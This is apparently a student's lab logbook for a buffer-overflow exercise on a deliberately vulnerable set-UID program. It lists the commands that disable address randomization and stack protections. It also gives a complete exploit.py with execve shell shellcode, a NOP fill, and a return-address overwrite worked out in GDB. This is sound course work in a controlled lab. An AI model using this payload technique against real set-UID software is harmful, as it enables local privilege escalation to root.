## Buffer-Overflow Attack Lab - Set-UID Version



Setup of the system:

Disabling the address randomization:

> $ sudo sysctl -w kernel.randomize_va_space=0

Changing shell create a symbolic link from /bin/sh to /bin/zsh, making our future attack easier:

> $ sudo ln -sf /bin/zsh /bin/sh


### Task 1

We compiled the ```call_shellcode.c```file and ran the -m32 and 64 versions:

![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task1LOGBOOK5_32.png)

*Image 1 - m32 shell.*


![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task1LOGBOOK5_64.png)
-
*Image 2 - 64 shell.*

The shell opened successfully in both.

### Task 2

Before compiling the vulnerable program, we disabled the StackGuard and the
non-executable stack protections and made it a root-owned Set-UID program.

> $ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c

> $ sudo chown root stack 

> $ sudo chmod 4755 stack 



Next, we changed the value of the L1 variable acoording to our group number:

![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task2LOGBOOK5.png)

*Image 3 - L1 variable.*

And ran ```make stack-L1``` successfully.


### Task 3

To exploit the buffer-overflow vulnerability, we needed to know the distance between the buffer's start and the return address. Using GDB, we set a breakpoint in the vulnerable function and checked the base pointer (EBP) and buffer address. This allowed us to calculate the offsets needed to create a payload that overwrites the return address, letting our shellcode execute.

After executing the commands provided in the guide, we obtained the following output:

![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task3_LOGBOOK5_1.png)



Next, we modified the file ```exploit.py``` as follows:

```
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode) - 1                # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffca0c + start           # Change this number 
offset = 0xffffcaa8 + 4 - 0xffffca0c   # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```



Explanation of the modifications: 

Here, we placed the shellcode at the end of the buffer, to ensure there is enough space for the entire payload:

> start = (517 - len(shellcode) - 1)

By adding ```start``` to the buffer's base address, ```ret``` points to where the shellcode starts. This address will replace the return pointer so that when the function "returns" it jumps to our shellcode and runs it.

> ret = 0xffffca0c + start 

This calculates the distance from the buffer’s start to the return address by moving 4 bytes from the saved base pointer (0xffffcaa8) to reach the return address, then subtracting the buffer start address (0xffffca0c).This offset lets us place our ```ret``` address at the right point in the payload to redirect execution to our shellcode.

> offset = 0xffffcaa8 + 4 - 0xffffca0c 

Finally we obtained the expected result and the attack was successfully done:
![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task3_LOGBOOK5_2.png)



